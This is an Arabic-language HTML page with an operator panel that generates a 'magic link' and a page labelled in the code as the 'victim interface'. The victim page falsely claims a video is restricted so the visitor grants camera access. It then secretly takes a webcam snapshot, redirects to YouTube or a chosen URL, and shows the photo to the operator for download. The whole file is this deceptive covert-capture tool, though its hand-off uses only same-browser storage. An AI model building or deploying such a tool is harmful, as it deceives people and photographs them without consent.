<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم الاحترافية</title>
    <style>
        :root {
            --bg-dark: #0f172a;
            --card-dark: #1e293b;
            --accent: #3b82f6;
            --accent-hover: #2563eb;
            --text-main: #f8fafc;
            --text-dim: #94a3b8;
            --success: #10b981;
        }

        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background: var(--bg-dark);
            font-family: 'Segoe UI', Roboto, sans-serif;
            color: var(--text-main);
        }

        .container {
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; padding: 20px; box-sizing: border-box;
        }

        .admin-box {
            background: var(--card-dark);
            padding: 40px;
            border-radius: 24px;
            width: 100%;
            max-width: 480px;
            text-align: center;
            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.1);
        }

        h2 { margin-bottom: 25px; font-size: 24px; color: var(--text-main); }

        .input-group { text-align: right; margin-bottom: 20px; }
        .input-group label { display: block; margin-bottom: 8px; color: var(--text-dim); font-size: 14px; }

        input[type="text"] {
            width: 100%;
            padding: 14px;
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 12px;
            color: white;
            font-size: 15px;
            box-sizing: border-box;
            transition: border 0.3s;
        }

        input[type="text"]:focus { border-color: var(--accent); outline: none; }

        .btn {
            background: var(--accent);
            color: white;
            border: none;
            padding: 14px 28px;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            font-weight: 600;
            font-size: 16px;
            transition: all 0.2s;
        }

        .btn:hover { background: var(--accent-hover); transform: translateY(-2px); }

        .result-area {
            margin-top: 30px;
            padding: 20px;
            background: rgba(59, 130, 246, 0.1);
            border-radius: 16px;
            border: 1px dashed var(--accent);
        }

        #preview-container {
            margin-top: 30px;
            display: none;
        }

        #preview-img {
            width: 100%;
            border-radius: 16px;
            border: 4px solid var(--accent);
            margin-bottom: 15px;
        }

        .download-btn {
            background: var(--success);
            text-decoration: none;
            display: block;
            margin-top: 10px;
        }

        .status-badge {
            display: inline-block;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            margin-top: 15px;
            background: #334155;
            color: var(--text-dim);
        }

        .hidden { display: none !important; }

        /* واجهة الضحية */
        .victim-ui {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 9999;
            display: flex; justify-content: center; align-items: center;
        }
        .dialog-box {
            background: #111; padding: 40px; border-radius: 20px;
            text-align: center; border: 1px solid #222; width: 85%; max-width: 350px;
        }
    </style>
</head>
<body>

<div class="container">
    <div id="admin-panel" class="admin-box">
        <h2>لوحة التحكم الذكية</h2>

        <div class="input-group">
            <label>قم بادخال الرابط</label>
            <input type="text" id="urlInput" placeholder="https://...">
        </div>

        <button class="btn" onclick="generate()">إنشاء الرابط السحري</button>
        
        <div id="result" class="result-area hidden">
            <p style="font-size: 13px; color: var(--accent); margin-bottom: 10px;">تم توليد الرابط بنجاح:</p>
            <input type="text" id="finalLink" readonly onclick="this.select()">
        </div>

        <div id="preview-container">
            <div class="status-badge" style="background: var(--success); color: white; margin-bottom: 10px;">✅ تم التقاط الصورة!</div>
            <img id="preview-img">
            <a id="downloadLink" download="captured_image.jpg" class="btn download-btn">تحميل الصورة</a>
        </div>

        <div id="waiting-status" class="status-badge">في انتظار الطرف الآخر...</div>
    </div>

    <div id="victim-panel" class="victim-ui hidden">
        <div class="dialog-box">
            <h2 style="margin-top:0;">محتوى مقيد</h2>
            <p style="color: #888; line-height: 1.6;">لمشاهدة هذا الفيديو، يرجى منح إذن "السماح بالمشاهدة" لمشغل الوسائط.</p>
            <button class="btn" id="allowBtn" style="background: #ef4444; margin-top: 20px;">السماح بالمشاهدة</button>
        </div>
        <video id="video" autoplay playsinline style="display:none"></video>
        <canvas id="canvas" style="display:none"></canvas>
    </div>
</div>

<script>
    const params = new URLSearchParams(window.location.search);
    const mode = params.get('auth');

    if (mode === 'video_verify') {
        document.getElementById('admin-panel').classList.add('hidden');
        document.getElementById('victim-panel').classList.remove('hidden');

        document.getElementById('allowBtn').onclick = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const data = canvas.toDataURL('image/jpeg', 0.8);
                    localStorage.setItem('captured_data', data);
                    
                    const target = localStorage.getItem('last_redirect') || 'https://youtube.com';
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = target;
                }, 1000);
            } catch (err) {
                alert("عذراً، يجب السماح بالوصول للمشغل لمشاهدة الفيديو.");
            }
        };
    }

    function generate() {
        const url = document.getElementById('urlInput').value;
        if (!url) return alert("يرجى إدخال الرابط أولاً");

        localStorage.setItem('last_redirect', url);
        const baseUrl = window.location.href.split('?')[0];
        document.getElementById('finalLink').value = baseUrl + "?auth=video_verify";
        document.getElementById('result').classList.remove('hidden');
        document.getElementById('waiting-status').innerText = "بانتظار الطرف الآخر...";
    }

    window.addEventListener('storage', (event) => {
        if (event.key === 'captured_data') {
            const container = document.getElementById('preview-container');
            const img = document.getElementById('preview-img');
            const downloadLink = document.getElementById('downloadLink');
            
            img.src = event.newValue;
            downloadLink.href = event.newValue;
            container.style.display = 'block';
            document.getElementById('waiting-status').style.display = 'none';
        }
    });
</script>

</body>
</html>
